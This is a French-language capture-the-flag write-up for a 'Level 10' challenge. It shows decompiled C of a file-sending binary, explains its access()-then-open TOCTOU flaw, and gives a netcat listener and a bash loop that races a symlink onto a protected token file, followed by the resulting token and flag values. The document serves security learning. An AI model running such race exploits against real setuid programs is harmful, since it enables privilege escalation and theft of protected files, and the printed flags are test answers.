## Level 10:

Plus complique ici  :
```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    char const* const var_1060;
    int32_t* esp = &var_1060;
    void* gsbase;
    int32_t var_14 = *(gsbase + 0x14);
    if (argc <= 2)
    {
        var_1060 = "%s file host\n\tsends file to ho…";
        printf("%s file host\n\tsends file to ho…", *argv);
        var_1060 = 1;
        exit(1);
        /* no return */
    }
    int32_t eax_5 = argv[1];
    int32_t eax_7 = argv[2];
    var_1060 = argv[1];
    int32_t eax_29;
    if (access(var_1060, 4) != 0)
    {
        var_1060 = "You don't have access to %s\n";
        eax_29 = printf("You don't have access to %s\n", eax_5);
    }
    else
    {
        var_1060 = "Connecting to %s:6969 .. ";
        printf("Connecting to %s:6969 .. ", eax_7);
        var_1060 = stdout;
        fflush(var_1060);
        var_1060 = 2;
        int32_t eax_12 = socket(2, 1, 0);
        int32_t var_18 = 0;
        int32_t var_14_1 = 0;
        int32_t var_10_1 = 0;
        int32_t var_c_1 = 0;
        var_18 = 2;
        char* var_1028;
        in_addr_t var_14_2 = inet_addr(var_1028);
        *var_18[2] = htons(0x1b39);
        char const* const var_1048;
        esp = &var_1048;
        int32_t var_101c;
        if (connect(eax_12, &var_18, 0x10) == 0xffffffff)
        {
            var_1048 = "Unable to connect to host %s\n";
            printf("Unable to connect to host %s\n", var_101c);
            var_1048 = 1;
            exit(1);
            /* no return */
        }
        char* var_1018;
        var_1048 = var_1018;
        if (write(var_1048, ".*( )*.\n", 8) == 0xffffffff)
        {
            var_1048 = "Unable to write banner to host %…";
            printf("Unable to write banner to host %…", var_101c);
            var_1048 = 1;
            exit(1);
            /* no return */
        }
        var_1048 = "Connected!\nSending file .. ";
        printf("Connected!\nSending file .. ");
        var_1048 = stdout;
        fflush(var_1048);
        char* var_1020;
        var_1048 = var_1020;
        int32_t eax_21 = open(var_1048, 0);
        if (eax_21 == 0xffffffff)
        {
            var_1048 = "Damn. Unable to open file";
            puts("Damn. Unable to open file");
            var_1048 = 1;
            exit(1);
            /* no return */
        }
        var_1048 = eax_21;
        void var_100c;
        ssize_t eax_23 = read(var_1048, &var_100c, 0x1000);
        if (eax_23 == 0xffffffff)
        {
            var_1048 = *__errno_location();
            char* eax_26 = strerror(var_1048);
            var_1048 = "Unable to read from file: %s\n";
            printf("Unable to read from file: %s\n", eax_26);
            var_1048 = 1;
            exit(1);
            /* no return */
        }
        var_1048 = var_1018;
        write(var_1048, &var_100c, eax_23);
        var_1048 = "wrote file!";
        eax_29 = puts("wrote file!");
    }
    if (esp[0x413] == *(gsbase + 0x14))
    {
        return eax_29;
    }
    __stack_chk_fail();
    /* no return */
}
```

Le main nous apprend 2 choses : 
- On cherche une connection sur le port 6969    
(donc on doit lancer une connection avec ``` nc -lk 6969```)
- On utilise access avant de read, donc on peut faire un TOCTOU (Time Of Check to Time Of Use)

voici un petit script pour mettre ca en place :
```script.sh
#!/bin/bash

# Nom du lien symbolique
LINK="/tmp/my_link"

# Fichier autorisé
FILE1="/tmp/test"

# Fichier protégé
FILE2="/home/user/level10/token"

# Boucle infinie pour changer le lien
while true; do
    ln -sf "$FILE1" "$LINK"
    ln -sf "$FILE2" "$LINK"
done
```
Il faut au prealable creer test (dans /tmp) et donner les droits d'exec au script.

Puis lancer : ```/tmp/script.sh & ./level10 /tmp/my_link 127.0.0.1```

Avec un peu de chance (timing) ca donnera le token : ```woupa2yuojeeaaed06riuj63c```

feulo4b72j7edeahuete3no7c